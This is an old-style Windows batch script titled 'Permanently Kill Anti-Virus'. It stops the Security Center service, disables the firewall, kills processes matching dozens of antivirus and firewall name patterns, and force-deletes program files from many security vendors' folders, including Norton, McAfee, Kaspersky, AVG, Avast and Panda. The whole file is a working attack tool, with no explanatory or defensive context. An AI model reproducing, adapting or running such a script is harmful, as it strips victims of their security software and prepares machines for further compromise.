@echo off
color 7
rem
rem Permanently Kill Anti-Virus
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
cls
tskill /A fire*
cls
tskill /A anti*
cls
tskill /A spy*
cls
tskill /A bullguard
cls
tskill /A PersFw
cls
tskill /A KAV*
cls
tskill /A ZONEALARM
cls
tskill /A SAFEWEB
cls
tskill /A spy*
cls
tskill /A bullguard
cls
tskill /A PersFw
cls
tskill /A KAV*
cls
tskill /A ZONEALARM
cls
tskill /A SAFEWEB
cls
tskill /A OUTPOST
cls
tskill /A nv*
cls
tskill /A nav*
cls
tskill /A F-*
cls
tskill /A ESAFE
cls
tskill /A cle
cls
tskill /A BLACKICE
cls
tskill /A def*
cls
tskill /A kav
cls
tskill /A kav*
cls
tskill /A avg*
cls
tskill /A ash*
cls
tskill /A aswupdsv
cls
tskill /A ewid*
cls
tskill /A guard*
cls
tskill /A guar*
cls
tskill /A gcasDt*
cls
tskill /A msmp*
cls
tskill /A mcafe*
cls
tskill /A mghtml
cls
tskill /A msiexec
cls
tskill /A outpost
cls
tskill /A isafe
tskill /A zap*
tskill /A zauinst
cls
tskill /A upd*
tskill /A zlclien*
cls
tskill /A minilog
tskill /A cc*
cls
tskill /A norton*
cls
tskill /A norton au*
cls
tskill /A ccc*
cls
tskill /A npfmn*
cls
tskill /A loge*
cls
tskill /A nisum*
cls
tskill /A issvc
cls
tskill /A tmp*
cls
tskill /A tmn*
cls
tskill /A pcc*
cls
tskill /A cpd*
cls
tskill /A pop*
cls
tskill /A pav*
cls
tskill /A padmin
cls
tskill /A panda*
cls
tskill /A avsch*
cls
tskill /A sche*
cls
tskill /A syman*
cls
tskill /A virus*
cls
tskill /A realm*
tskill /A sweep*
cls
tskill /A scan*
cls
tskill /A ad-*
cls
tskill /A safe*
cls
tskill /A avas*
cls
tskill /A norm*
cls
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.*
cls
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe
cls
del /Q /F C:\Program Files\kasper~1\*.exe
cls
del /Q /F C:\Program Files\trojan~1\*.exe
cls
del /Q /F C:\Program Files\f-prot95\*.dll
del /Q /F C:\Program Files\tbav\*.datcls
cls
del /Q /F C:\Program Files\avpersonal\*.vdf
del /Q /F C:\Program Files\Norton~1\*.cnt
cls
del /Q /F C:\Program Files\Mcafee\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.*
cls
del /Q /F C:\Program Files\Norton~1\Norton~1\*.*
cls
del /Q /F C:\Program Files\Norton~1\*.*
cls
del /Q /F C:\Program Files\avgamsr\*.exe
cls
del /Q /F C:\Program Files\avgamsvr\*.exe
cls
del /Q /F C:\Program Files\avgemc\*.exe
cls
del /Q /F C:\Program Files\avgcc\*.exe
cls
del /Q /F C:\Program Files\avgupsvc\*.exe
cls
del /Q /F C:\Program Files\grisoft
cls
del /Q /F C:\Program Files\nood32krn\*.exe
cls
del /Q /F C:\Program Files\nood32\*.exe
cls
del /Q /F C:\Program Files\nod32
cls
del /Q /F C:\Program Files\nood32
cls
del /Q /F C:\Program Files\kav\*.exe
cls
del /Q /F C:\Program Files\kavmm\*.exe
cls
del /Q /F C:\Program Files\kaspersky\*.*
cls
del /Q /F C:\Program Files\ewidoctrl\*.exe
cls
del /Q /F C:\Program Files\guard\*.exe
cls
del /Q /F C:\Program Files\ewido\*.exe
cls
del /Q /F C:\Program Files\pavprsrv\*.exe
cls
del /Q /F C:\Program Files\pavprot\*.exe
cls
del /Q /F C:\Program Files\avengine\*.exe
cls
del /Q /F C:\Program Files\apvxdwin\*.exe
cls
del /Q /F C:\Program Files\webproxy\*.exe
cls
del /Q /F C:\Program Files\panda
software\*.*
rem
cls
color a
echo Done!
pause